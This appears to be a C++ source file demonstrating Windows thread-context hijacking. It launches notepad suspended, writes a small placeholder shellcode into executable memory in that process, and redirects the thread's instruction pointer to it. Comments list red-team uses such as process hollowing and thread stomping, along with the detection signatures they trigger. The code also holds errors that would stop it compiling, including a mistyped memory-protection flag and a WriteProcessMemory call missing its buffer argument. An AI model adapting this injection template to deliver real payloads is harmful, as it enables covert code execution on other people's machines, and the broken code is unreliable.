#include<windows.h>
#include<iostream>

/*
    Manipulating a thread's context enables advanced post-exploitation techniques such as:

    Process Hollowing	Overwrite a suspended process and point RIP to shellcode
    Thread Hijacking	Change the execution of a remote thread
    Reflective Loaders	Set instruction pointer to a loader stub
    Shellcode Launch	Redirect execution flow to memory regions with payloads

    BOOL GetThreadContext(
    HANDLE hThread,
    LPCONTEXT lpContext
    );

    BOOL SetThreadContext(
    HANDLE hThread,
    const CONTEXT *lpContext
    );

*/

int main(){
    STARTUPINFO si = {sizeof(STARTUPINFO)};
    PROCESS_INFORMATION pi;

    if(!CreateProcessW("c:\\windows\\system32\\notepad.exe",NULL,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&si,&pi)){
        printf("[-] %s CreateProcessW ERROR=0x%08x",__FUNCTION__,GetLastError());
        return -1;
    }
    LPVOID remoteShellcode = VirtualAllocEx(pi.hProcess,NULL,0x1000,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE,READWRITE);
    BYTE shellcode[] =  {0x90,0x90,0xc3};
    BOOL result = WriteProcessMemory(pi.hProcess,remoteShellcode,sizeof(shellcode),NULL);
    if(!result){
        printf("[-] %s WriteProcessMemory ERROR=0x%08x",GetLastError());
        return -1;
    }
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    if(GetThreadContext(pi.hThread,&ctx)){
        std::cout << "Original RIP" << std::hex << ctx.Rip << std::endl;
        ctx.Rip = (DWORD64)remoteShellcode;
        SetThreadContext(pi.hThread,&ctx);
    }else{
        std::cerr << "GetThreadContext Failed" << std::endl;
        return -1;
    }
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;

}

/*
Red Team and Offensive Use Cases
    Process Hollowing	Modify the RIP of the primary thread to point to injected payload
    Thread Stomping	Modify existing thread context of a benign process to execute your code
    Payload Launchers	Create a dummy thread and set its context before starting
    Direct Injection	Inject shellcode into RWX memory and point a thread to it

    Using SetThreadContext on another process	High
    Suspended thread + modified RIP	Common signature for injection
    Writing to RWX memory + context hijack	Often triggers behavioral rules

    
*/